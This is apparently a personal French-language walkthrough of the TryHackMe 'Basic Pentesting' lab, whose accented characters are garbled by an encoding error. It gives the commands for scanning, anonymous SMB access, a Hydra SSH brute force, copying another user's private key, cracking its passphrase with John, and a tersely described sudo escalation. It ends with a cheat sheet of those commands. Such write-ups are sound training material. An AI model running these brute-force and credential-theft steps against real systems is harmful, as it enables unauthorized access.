---
tags:
  - plateforme/thm
  - os/linux
  - status/completed
difficulty: easy
ip: 10.10.10.25
url: https://tryhackme.com/room/basicpentestingjt
creation_date: 2025-10-27
completion_date: 2025-10-27
---
# Basic Pentesting - TryHackMe

## ğŸ“ Description & Objectifs
Room d'introduction au pentesting couvrant :
- Ã‰numÃ©ration de services
- Exploitation SMB
- Cracking de hash
- Escalade de privilÃ¨ges via SSH

---

## ğŸ•µï¸â€â™‚ï¸ Phase 1 : Ã‰numÃ©ration & Reconnaissance

### ğŸ—ºï¸ Scan Nmap
```bash
nmap -sV -sC -oN nmap_results.txt 10.10.10.25
```

**RÃ©sultats :**
- Port 22 (SSH) - OpenSSH 7.2p2
- Port 80 (HTTP) - Apache 2.4.18
- Port 139/445 (SMB) - Samba 4.3.11
- Port 8009 (AJP) - Apache Jserv
- Port 8080 (HTTP) - Apache Tomcat

### ğŸŒ Ã‰numÃ©ration Web
```bash
gobuster dir -u http://10.10.10.25 -w /usr/share/wordlists/dirb/common.txt
```

**DÃ©couvertes :**
- `/development` - Notes de dÃ©veloppement exposÃ©es

### ğŸ“ Ã‰numÃ©ration SMB
```bash
enum4linux -a 10.10.10.25
smbclient -L //10.10.10.25 -N
```

**Partages trouvÃ©s :**
- `Anonymous` - Accessible sans mot de passe
- Fichiers : `staff.txt` (liste d'utilisateurs)

---

## ğŸ’¥ Phase 2 : Exploitation

**Vecteur d'attaque :** [[SMB Anonymous Access]] + [[SSH Bruteforce]]

### Ã‰tape 1 : RÃ©cupÃ©ration d'informations
```bash
smbclient //10.10.10.25/Anonymous -N
get staff.txt
```

**Utilisateurs identifiÃ©s :**
- jan
- kay

### Ã‰tape 2 : Bruteforce SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.25
```

**RÃ©sultat :** Mot de passe trouvÃ© : `armando`

### Ã‰tape 3 : Connexion SSH
```bash
ssh jan@10.10.10.25
# Password: armando
```

âœ… **AccÃ¨s utilisateur obtenu**

---

## ğŸš€ Phase 3 : Ã‰lÃ©vation de PrivilÃ¨ges

### Ã‰numÃ©ration Post-Exploitation
```bash
id
sudo -l
find / -perm -4000 2>/dev/null
ls -la /home
```

**DÃ©couverte :** ClÃ© SSH privÃ©e de kay dans `/home/kay/.ssh/id_rsa`

### Exploitation
```bash
# Copie de la clÃ© privÃ©e
cat /home/kay/.ssh/id_rsa
# Sauvegarde locale
chmod 600 kay_id_rsa

# La clÃ© est protÃ©gÃ©e par passphrase
ssh2john kay_id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Passphrase trouvÃ©e :** `beeswax`

```bash
ssh -i kay_id_rsa kay@10.10.10.25
# Passphrase: beeswax

# VÃ©rification des privilÃ¨ges
sudo -l
# kay peut exÃ©cuter /usr/bin/pass en tant que root

# Exploitation
sudo /usr/bin/pass
```

âœ… **Root obtenu**

---

## ğŸ’¡ Takeaways & Commandes Utiles

**LeÃ§ons apprises :**
1. Toujours Ã©numÃ©rer SMB - les partages anonymes contiennent souvent des infos sensibles
2. Les clÃ©s SSH peuvent Ãªtre crackÃ©es avec `ssh2john` + `john`
3. VÃ©rifier les permissions sur les fichiers des autres utilisateurs

**Commandes clÃ©s :**
```bash
# Ã‰numÃ©ration SMB complÃ¨te
enum4linux -a <IP>
smbclient -L //<IP> -N

# Crack de clÃ© SSH
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# Ã‰numÃ©ration post-exploit
find / -perm -4000 2>/dev/null  # SUID
getcap -r / 2>/dev/null          # Capabilities
```

**Outils utilisÃ©s :**
- [[Nmap]]
- [[Gobuster]]
- [[enum4linux]]
- [[Hydra]]
- [[John the Ripper]]

**VulnÃ©rabilitÃ©s rencontrÃ©es :**
- [[SMB Anonymous Access]]
- [[Weak SSH Credentials]]
- [[Sudo Misconfiguration]]
